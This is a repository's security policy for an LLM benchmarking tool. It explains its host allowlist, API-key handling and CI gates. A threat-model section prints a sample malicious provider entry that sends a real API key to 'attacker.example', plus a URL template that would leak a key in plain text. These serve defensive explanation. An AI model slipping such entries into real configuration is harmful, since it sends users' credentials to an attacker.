# Security

## What this repo can do to your machine

**Nothing you have not asked it to.** Stated concretely, so you can check rather than trust:

- **Zero dependencies.** Python standard library only. No `pip install`, no `requirements.txt`, no
  lockfile, no transitive package that can be taken over next month. This is the single most important
  security property here, and any pull request that adds a dependency has to justify itself against it.
- **No `eval`, no `exec`, no `pickle`, no `subprocess`, no shell.** Grep for them.
- **It sends HTTP requests to ten hosts, and only those ten.** They are listed in code, in
  `ALLOWED_HOSTS` in [`bench/gate_contributions.py`](bench/gate_contributions.py). `benchmark.py`
  refuses any other destination at request time, and a redirect that changes host is refused too,
  because the Authorization header would travel with it.
- **It writes files only where you tell it** (`--out`), plus the language pack it reads by code, and
  that code is validated against `[a-z]{2,8}` before it is put in a path.
- **Your API keys are read from environment variables and go into exactly one place**: the
  `Authorization` header of a request to one of those ten hosts. They are never written to a file,
  never logged, and provider error bodies are redacted before anything is saved.

## The attack this repo is actually shaped like

Worth naming, because it is not obvious and it is the reason for half the checks:

`benchmark.py` reads **both** the endpoint URL and the name of the environment variable holding the API
key out of [`bench/providers.json`](bench/providers.json) — and [CONTRIBUTING.md](CONTRIBUTING.md)
invites strangers to add providers by editing exactly that file. A pull request adding

```json
{"name": "fastllm", "url": "https://attacker.example/v1/chat/completions", "key_env": "GROQ_API_KEY"}
```

would make everyone who runs the battery send their real Groq key to a server the contributor controls.
It needs no exploit. It needs a merge.

Four things stop it, and they are checked by
[`bench/gate_contributions.py`](bench/gate_contributions.py) on every pull request:

1. **A key variable is bound to one host, forever.** A variable already in the file may never appear
   again pointing somewhere else.
2. **Destinations live in code, not in data.** A JSON-only pull request cannot add a host. Adding one is
   an edit to the gate, in the same PR, where a reviewer sees it.
3. **A provider may not claim another provider's key variable.** Legitimate exceptions (Google issues
   `GEMINI_API_KEY`, Cloudflare uses `CF_API_TOKEN`) are declared in the gate, in code.
4. **Only `CF_ACCOUNT_ID` may be interpolated into a URL.** Otherwise a path like
   `https://evil.example/{OPENROUTER_API_KEY}/` would leak a second key in plain text.

The same checks run again inside `benchmark.py` at request time, for anyone running a modified
`providers.json` on their own machine.

## What runs in CI, on every pull request

| Gate | What it refuses |
|---|---|
| `bench/test_probes.py` | a scoring checker that has drifted, tested in both directions |
| `bench/test_gate.py` | a publication gate that has stopped catching things |
| `bench/gate_publish.py` | an API key, the calling account state, a private path, a rate limit multiplied across keys |
| `bench/gate_contributions.py` | a contributed provider that points a key at a new host |

CI runs on `pull_request`, never `pull_request_target`, so code from a fork runs without access to any
secret and without write permission. The daily job has `contents: write` because it commits the
catalogue diff; nothing else does.

## Reporting something

Open a [security advisory](../../security/advisories/new), or a normal issue if it is not sensitive.

We would genuinely rather hear that a gate has a hole than believe it does not. If you find one, the
most useful report is a failing case added to `bench/test_gate.py` — that way the hole cannot come back
quietly, which is how it got there in the first place.

**Please do not** open pull requests containing real API keys, even expired ones, even as test data. Use
the shape-only fakes in `bench/test_gate.py` as a model. GitHub's push protection is enabled on this
repo and will block most of them, but not all.

## What we do not claim

- We have not audited the ten providers. Sending them a prompt means trusting them with that prompt.
- The published results contain model outputs. They were generated from our prompts, but a language
  model can produce anything, and we do not vouch for the content of a paragraph a model wrote.
- The gates here are written by the same people who wrote the code they check. That is a real
  limitation, and the reason every gate is tested in both directions rather than merely run.
